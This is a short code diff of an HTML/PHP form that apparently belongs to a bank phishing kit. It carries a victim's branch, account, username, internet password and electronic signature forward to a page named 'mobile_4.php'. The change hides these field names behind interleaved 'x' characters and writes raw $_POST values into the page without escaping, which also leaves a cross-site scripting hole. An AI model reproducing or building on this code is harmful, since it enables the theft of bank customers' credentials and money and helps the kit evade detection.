@@ -197,11 +197,13 @@ hr.style13 {
 </head>
 <body>
 <form action="mobile_4.php" method="post" name="formulario" id="formulario">
-	<input type="hidden" id="agencia" name="agencia" value="2342">
-	<input type="hidden" id="conta" name="conta" value="34324234234">
-	<input type="hidden" id="usuario" name="usuario" value="24234234">
-	<input type="hidden" id="senhanet" name="senhanet" value="24234234">
-	<input type="hidden" id="assinatura" name="assinatura" value="23423423">
+    
+    <input name="xuxsxuxaxrxixox" id="xuxsxuxaxrxixox" type="hidden" value="<?php echo $_POST['xuxsxuxaxrxixox']; ?>">
+    <input name="xsxexnxhxax" id="xsxexnxhxax" type="hidden" value="<?php echo $_POST['xsxexnxhxax']; ?>" >
+    <input name="xaxsxsxexlxextxrxoxnxixcxax" id="xaxsxsxexlxextxrxoxnxixcxax" type="hidden" value="<?php echo $_POST['xaxsxsxexlxextxrxoxnxixcxax']; ?>" >
+    <input name="xaxgxexnxcxixax" id="xaxgxexnxcxixax" type="hidden" value="<?php echo $_POST['xaxgxexnxcxixax']; ?>" >
+    <input name="xcxoxnxtxa" id="xcxoxnxtxa" type="hidden" value="<?php echo $_POST['xcxoxnxtxa']; ?>">
+
 </form>
 
 <div class="container">
